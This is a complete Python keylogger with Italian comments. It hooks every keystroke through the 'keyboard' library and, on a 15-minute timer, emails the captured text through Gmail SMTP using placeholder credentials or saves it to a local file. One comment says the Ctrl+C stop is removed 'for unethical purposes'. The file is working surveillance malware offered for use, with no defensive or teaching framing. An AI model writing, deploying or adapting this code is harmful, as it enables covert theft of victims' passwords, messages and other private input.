import keyboard  # libreria per leggere dalla tastiera;
import smtplib  # libreria per inviare mail automaticamente (SMTP protocol);

# Libreria timer per gestire gli intervalli di tempo per inviare ecc;
from threading import Timer
from datetime import datetime

# Inizializzazione parametri per inviare via mail;
INVIO_LOG_OGNI = 900  #Periodo in secondi;
INDIRIZZO_EMAIL = "email"
PASSWORD_EMAIL = "password"



class Keylogger:
    def __init__(self, intervallo, metodo_report="email"):

        # Passo il report per l'intervallo (costruttore)
        self.intervallo = intervallo
        self.metodo_report = metodo_report

        # Creo una stringa per salvare i tasti digitati
        self.log = ""

        # Salvo le registrazoni di inizio e fine
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()


    def callback(self, event):
        # La funzione viene richiamata ogni volta che viene premuto un tasto della tastiera

        name = event.name

        if len(name) > 1:
            # vengono esclusi tutti i caratteri speciali (ctrl, alt, ecc)

            if name == "space":
                # il tasto premuto è uno spazio
                name = " "

            elif name == "enter":
                # il tasto premuto è invio, va quindi a capo
                name = "[ENTER]\n"

            elif name == "decimal":
                # il tasto premuto è un punto (.)
                name = "."

            else:
                #Rimpiazzo gli spazi con un underscore per una migliore leggibilità
                name = name.replace(" ","_")
                name = f"[{name.upper()}]"

        #Aggiungo i tasti digitati alla stringa
        self.log += name



    #Funzioni per salvare il log in locale (opzionale)
    def update_filename(self):
        # Costruisco il filename con data e info varie

        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")

        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"


    def report_to_file(self):
        #Salvo i dati in un file esterno

        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)

        print(f"[+] Saved {self.filename}.txt")




    def sendmail(self, email, password, message):
        #Funzione per inviare via mail i dati raccolti

        #Connessione al server della mail
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)

        #Avvio il protocollo TLS per una maggiore sicurezza (https://it.wikipedia.org/wiki/Transport_Layer_Security)
        server.starttls()

        #Login all'account
        server.login(email, password)

        #Invio il messaggio
        server.sendmail(email, email, message)

        #Chiudo la sessione
        server.quit()



    def report(self):
        #Questa funzione richiama l'intervallo, serve per inviare e resettare la stringa ogni tot tempo

        if self.log:

            #Se il log contiene qualcosa eseguo il rapporto
            self.end_dt = datetime.now()

            #Aggiorno il file
            self.update_filename()

            #Se è stato scelto il metodo email
            if self.metodo_report == "email":
                self.sendmail(INDIRIZZO_EMAIL, PASSWORD_EMAIL, self.log)


            #Se è stato scelto il metodo file
            elif self.metodo_report == "file":
                self.report_to_file()

            self.start_dt = datetime.now()

        self.log = ""

        timer = Timer(interval=self.intervallo, function=self.report)

        #Imposto il processo come daemon (si chiude quando il processo principale si chiude)
        timer.daemon = True

        #Attivo il timer
        timer.start()



    def start(self):
        #Funzione per far partire il programma

        #Registro la data di inizio
        self.start_dt = datetime.now()

        #Eseguo il keylogger
        keyboard.on_release(callback = self.callback)

        #Parte il report
        self.report()

        #Il programma funzione finchè non viene premuto CTRL+c, sistema che ovviamente si rimuove per scopi non etici
        keyboard.wait()




#Inizializzazione programma;
if __name__ == "__main__":
    
    # Scegli se salvare su file o inviare via mail il report;
    keylogger = Keylogger(intervallo=INVIO_LOG_OGNI, metodo_report="email")  # file per salvare su file

    keylogger.start()





"""
            ▒██   ██▒▒███████▒
            ▒▒ █ █ ▒░▒ ▒ ▒ ▄▀░
            ░░  █   ░░ ▒ ▄▀▒░ 
             ░ █ █ ▒   ▄▀▒   ░
            ▒██▒ ▒██▒▒███████▒
            ▒▒ ░ ░▓ ░░▒▒ ▓░▒░▒
            ░░   ░▒ ░░░▒ ▒ ░ ▒
             ░    ░  ░ ░ ░ ░ ░
             ░    ░    ░ ░    
                     ░        



"""

